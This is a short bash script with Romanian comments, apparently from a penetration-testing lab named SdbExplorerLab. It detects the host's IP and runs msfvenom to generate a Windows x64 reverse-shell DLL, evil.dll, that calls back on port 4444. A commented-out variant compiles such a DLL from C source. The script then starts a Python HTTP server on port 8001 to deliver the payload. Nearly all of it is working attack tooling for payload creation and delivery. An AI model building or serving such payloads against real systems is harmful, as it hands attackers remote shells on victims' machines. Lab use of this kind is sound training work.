#!/bin/bash

LAB_DIR="$HOME/BnB/SdbExplorerLab"
PORT="4444"

CURRENT_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

echo "[*] IP-ul curent al mașinii Ubuntu este: $CURRENT_IP"
echo "[*] Generăm noul evil.dll cu callback către $CURRENT_IP:$PORT..."

# 2. Generarea payload-ului evil.dll
# VARIANTA A (Dacă folosești msfvenom):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$CURRENT_IP LPORT=$PORT -f dll > "$LAB_DIR/evil.dll"

# VARIANTA B (Dacă ai cod sursă C/C++ și îl compilezi pe loc cu mingw-w64):
# Sed/awk pentru a înlocui un placeholder din codul C, urmat de compilare:
# sed -i "s/REPLACE_IP/$CURRENT_IP/g" src/evil.c
# x86_64-w64-mingw32-gcc -shared -o "$LAB_DIR/evil.dll" src/evil.c -lws2_32

echo "[*] Payload-ul evil.dll a fost actualizat!"

# 3. Pornim serverul web pentru Faza 2 a laboratorului
echo "[*] Pornim serverul web pentru a livra fișierele pe portul 8001..."
cd "$LAB_DIR"
python3 -m http.server 8001
